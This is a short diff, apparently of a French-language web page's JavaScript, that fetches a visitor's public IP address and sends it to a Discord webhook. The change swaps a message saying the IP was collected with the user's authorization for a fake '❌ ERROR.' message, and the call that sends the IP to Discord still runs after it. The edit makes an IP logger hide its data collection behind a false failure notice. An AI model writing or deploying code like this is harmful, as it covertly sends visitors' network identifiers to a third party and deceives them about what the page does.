@@ -183,7 +183,7 @@ if (
             publicIP.textContent = data.ip;
 
             status.textContent =
-                "✅ Adresse IP récupérée avec votre autorisation.";
+                "❌ ERROR.";
 
             // Envoi vers le webhook Discord
             await sendIpToDiscord(data.ip);
